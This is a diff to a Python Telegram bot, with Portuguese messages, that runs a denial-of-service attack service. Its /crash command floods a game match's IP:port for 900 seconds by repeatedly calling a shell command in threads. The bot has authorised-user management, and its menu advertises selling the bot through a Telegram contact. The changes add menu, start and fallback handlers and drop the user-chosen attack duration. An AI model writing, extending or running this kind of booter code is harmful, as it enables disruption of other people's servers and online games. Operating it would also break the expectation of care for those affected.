@@ -42,6 +42,31 @@ def executar_ataque(ip_porta, threads, duracao):
         subprocess.call(comando_terminal, shell=True)
         time.sleep(5)  # Aguarda 5 segundos antes de enviar novamente
 
+# Comando /menu
+@bot.message_handler(commands=['menu'])
+def menu(message):
+    menu_text = (
+        "Bem-vindo ao bot! 🚀\n\n"
+        "Aqui estão os comandos disponíveis para você:\n\n"
+        "*Comandos básicos:*\n"
+        "`/crash <IP da partida>` - Envia um ataque ao IP especificado por 900 segundos.\n"
+        "`/meuid` - Mostra seu ID de usuário.\n"
+        "`/info_player <ID>` - Exibe informações de um jogador por ID.\n\n"
+        "*Comandos para o dono do bot:*\n"
+        "`/adduser <ID>` - Adiciona um usuário autorizado.\n"
+        "`/removeuser <ID>` - Remove um usuário autorizado.\n"
+        "`/listusers` - Mostra a lista de usuários autorizados e seus cargos.\n\n"
+        "Quer comprar o bot? Entre em contato comigo no Telegram: "
+        "[werbert_ofc](https://t.me/werbert_ofc)\n\n"
+        "_Se precisar de ajuda, estou à disposição!_ 😉"
+    )
+    bot.send_message(message.chat.id, menu_text, parse_mode="Markdown")
+
+# Comando /start
+@bot.message_handler(commands=['start'])
+def start_message(message):
+    bot.send_message(message.chat.id, "Olá! Digite /menu para ver os comandos disponíveis.")
+
 # Comando /crash
 @bot.message_handler(commands=['crash'])
 def crash_server(message):
@@ -51,7 +76,7 @@ def crash_server(message):
 
     comando = message.text.split()
     if len(comando) < 2:
-        bot.send_message(message.chat.id, "Uso correto: /crash <IP:PORTA> [tempo (em segundos)]")
+        bot.send_message(message.chat.id, "Uso correto: /crash <IP:PORTA>")
         return
 
     ip_porta = comando[1]
@@ -61,14 +86,6 @@ def crash_server(message):
     if not validar_ip_porta(ip_porta):
         bot.send_message(message.chat.id, "Formato de IP:PORTA inválido.")
         return
-
-    # Verifica se o tempo foi especificado
-    if len(comando) == 3:
-        try:
-            duracao = int(comando[2])
-        except ValueError:
-            bot.send_message(message.chat.id, "Tempo inválido. Use um número em segundos.")
-            return
 
     # Inicia o ataque em uma nova thread
     thread_ataque = Thread(target=executar_ataque, args=(ip_porta, threads, duracao))
@@ -131,6 +148,11 @@ def list_users(message):
         user_list += f"ID: {user_id} - Cargo: {cargo}\n"
 
     bot.send_message(message.chat.id, user_list)
+
+# Qualquer texto inválido ou comando "/"
+@bot.message_handler(func=lambda message: True)
+def invalid_command(message):
+    menu(message)
 
 # Função principal
 def main():
